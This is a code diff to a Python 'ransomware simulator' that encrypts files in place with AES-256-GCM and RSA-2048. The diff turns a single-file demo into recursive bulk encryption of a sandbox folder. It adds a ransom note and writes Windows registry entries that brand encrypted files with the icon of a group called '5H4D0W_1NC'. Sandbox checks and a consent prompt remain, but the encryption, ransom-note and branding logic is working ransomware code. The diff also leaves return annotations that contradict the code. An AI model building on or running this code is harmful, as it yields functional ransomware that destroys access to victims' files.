@@ -14,8 +14,15 @@ from __future__ import annotations
 
 import argparse
 import os
+import ctypes
 from datetime import datetime
 from pathlib import Path
+
+# Standard Windows Registry access
+try:
+    import winreg
+except ImportError:
+    winreg = None
 
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding, rsa
@@ -28,11 +35,14 @@ PUBLIC_KEY_PATH = KEYS_DIR / "public_key.pem"
 # Store the private key outside the sandbox so only the public key remains there.
 PRIVATE_KEY_PATH = Path(__file__).resolve().with_name("private_key.pem")
 LOG_PATH = SANDBOX_PATH / "hybrid_demo.log"
+LOGO_PATH = Path(__file__).resolve().with_name("logo.png")
 
 ENCRYPTED_EXT = ".hyenc"
 FILE_MAGIC = b"HYBDEMO1"
 NONCE_SIZE = 12
-
+        
+        
+# Utility and Safety Functions
 
 def log(message: str) -> None:
     """Print and append a timestamped message to the sandbox log file."""
@@ -74,6 +84,69 @@ def assert_safe_file_path(path: Path) -> None:
     if path.is_dir():
         raise RuntimeError(f"Expected a file but received a directory: {path}")
 
+# --- Icon Logic (winreg scope) ---
+
+# Windows Registry integration for .hyenc file association with logo.png
+def set_file_association():
+    """Registers .hyenc files in the Windows Registry to use logo.png."""
+    if not winreg or not LOGO_PATH.exists():
+        log("Registry update skipped: logo.png not found or not on Windows.")
+        return
+
+    prog_id = "5H4D0W_1NC.Files"
+    icon_path = str(LOGO_PATH)
+
+    try:
+        # 1. Create the ProgID and set the icon
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{prog_id}") as key:
+            winreg.SetValue(key, "", winreg.REG_SZ, "5H4D0W_1NC Encrypted File")
+        
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{prog_id}\DefaultIcon") as key:
+            winreg.SetValue(key, "", winreg.REG_SZ, icon_path)
+
+        # 2. Associate the .hyenc extension with that ProgID
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{ENCRYPTED_EXT}") as key:
+            winreg.SetValue(key, "", winreg.REG_SZ, prog_id)
+
+        # 3. Notify Windows Shell to refresh icons
+        ctypes.windll.shell32.SHChangeNotify(0x08000000, 0, None, None)
+        log("Windows Registry updated: .hyenc files now use the group logo.")
+    except Exception as e:
+        log(f"Failed to set file association: {e}")
+    
+        
+# --- Registry Cleanup Integration ---
+
+def remove_file_association():
+    """Removes the .hyenc association from the Windows Registry."""
+    if not winreg:
+        return
+
+    extension = ".hyenc"
+    prog_id = "5H4D0W_1NC.Files"
+
+    try:
+        # 1. Delete the extension association
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{extension}")
+        except OSError: pass # Key already gone
+
+        # 2. Delete the ProgID and its DefaultIcon subkey
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{prog_id}\DefaultIcon")
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{prog_id}")
+        except OSError: pass
+
+        # 3. Force Windows to refresh the icons back to normal
+        ctypes.windll.shell32.SHChangeNotify(0x08000000, 0, None, None)
+        log("Windows Registry cleaned: .hyenc icons removed.")
+    except Exception as e:
+        log(f"Failed to remove file association: {e}")       
+        
+
+
+
+# Demo Functions
 
 def print_banner() -> None:
     """Display simulator banner with ASCII art."""
@@ -134,6 +207,7 @@ def require_consent(force_yes: bool) -> None:
     if answer != "I AGREE":
         raise RuntimeError("Consent not provided. Aborting.")
 
+# Core Cryptography Logic
 
 def generate_rsa_keypair() -> None:
     """Generate RSA-2048 keypair with the public key in sandbox and private key outside it."""
@@ -178,9 +252,9 @@ def load_private_key(path: Path):
     return serialization.load_pem_private_key(path.read_bytes(), password=None)
 
 
-def encrypt_file_hybrid(input_file: Path, public_key_file: Path) -> Path:
+def encrypt_file_hybrid(input_file: Path, public_key_file: Path) -> None:
     """
-    Encrypt one file using AES-256-GCM and wrap the AES key with RSA-2048.
+    Encrypt files using AES-256-GCM and wrap the AES key with RSA-2048.
 
     Output format:
     - magic(8)
@@ -229,11 +303,10 @@ def encrypt_file_hybrid(input_file: Path, public_key_file: Path) -> Path:
     input_file.write_bytes(header + wrapped_key + ciphertext)
     input_file.rename(output_file)
     log(f"Encrypted one file in place: {input_file} -> {output_file}")
-    create_ransom_note()
     return output_file
 
 
-def decrypt_file_hybrid(encrypted_file: Path, private_key_file: Path) -> Path:
+def decrypt_file_hybrid(encrypted_file: Path, private_key_file: Path) -> None:
     """Decrypt one .hyenc file and restore original name/content in place."""
     validate_sandbox()
     assert_safe_file_path(encrypted_file)
@@ -294,6 +367,37 @@ def decrypt_file_hybrid(encrypted_file: Path, private_key_file: Path) -> Path:
     return output_file
 
 
+# --- Bulk Orchestration ---
+
+def run_bulk_operation(mode: str, key_path: Path) -> None:
+    validate_sandbox()
+
+    # Walk sandbox
+    for file_path in SANDBOX_PATH.rglob("*"):
+        if not file_path.is_file(): continue
+        
+        # Safety exclusions
+        if KEYS_DIR in file_path.parents or file_path == LOG_PATH or file_path.name in ["note.txt", "desktop.ini"]:
+            continue
+
+        try:
+            if mode == "encrypt" and file_path.suffix != ENCRYPTED_EXT:
+                encrypt_file_hybrid(file_path, key_path)
+                set_file_association()
+            elif mode == "decrypt" and file_path.suffix == ENCRYPTED_EXT:
+                decrypt_file_hybrid(file_path, key_path)
+                remove_file_association()
+        except Exception as e:
+            log(f"Failed processing {file_path.name}: {e}")
+
+    if mode == "encrypt":
+        create_ransom_note()
+    if mode == "decrypt":
+        note_path = SANDBOX_PATH / "note.txt"
+        if note_path.exists():
+            note_path.unlink()
+            log("Ransom note removed.")
+
 def create_ransom_note() -> None:
     """Create a note.txt file in the sandbox with encryption information."""
     validate_sandbox()
@@ -317,7 +421,6 @@ def create_ransom_note() -> None:
 
 
 def main() -> None:
-    """CLI entry point for safe single-file hybrid encryption demo."""
     parser = argparse.ArgumentParser(
         description="Safe sandbox-only hybrid crypto demo (AES-256 + RSA-2048)."
     )
@@ -325,8 +428,7 @@ def main() -> None:
 
     subparsers.add_parser("gen-keys", help="Generate RSA-2048 keypair in sandbox/keys.")
 
-    encrypt_parser = subparsers.add_parser("encrypt", help="Encrypt one file inside sandbox.")
-    encrypt_parser.add_argument("--file", required=True, help="Path to input file inside sandbox.")
+    encrypt_parser = subparsers.add_parser("encrypt", help="Encrypt files inside sandbox.")
     encrypt_parser.add_argument(
         "--public-key",
         default=str(PUBLIC_KEY_PATH),
@@ -334,8 +436,7 @@ def main() -> None:
     )
     encrypt_parser.add_argument("--yes", action="store_true", help="Skip interactive consent prompt.")
 
-    decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt one .hyenc file inside sandbox.")
-    decrypt_parser.add_argument("--file", required=True, help="Path to .hyenc file inside sandbox.")
+    decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt .hyenc files inside sandbox.")
     decrypt_parser.add_argument(
         "--private-key",
         default=str(PRIVATE_KEY_PATH),
@@ -351,15 +452,12 @@ def main() -> None:
             generate_rsa_keypair()
             return
 
-        if args.command == "encrypt":
+        elif args.command in ["encrypt", "decrypt"]:
             require_consent(args.yes)
-            encrypt_file_hybrid(Path(args.file), Path(args.public_key))
+            key_path = Path(args.public_key) if args.command == "encrypt" else Path(args.private_key)
+            run_bulk_operation(args.command, key_path)
             return
-
-        if args.command == "decrypt":
-            require_consent(args.yes)
-            decrypt_file_hybrid(Path(args.file), Path(args.private_key))
-            return
+        
     except Exception as exc:
         log(f"ERROR: {exc}")
         raise SystemExit(1) from exc
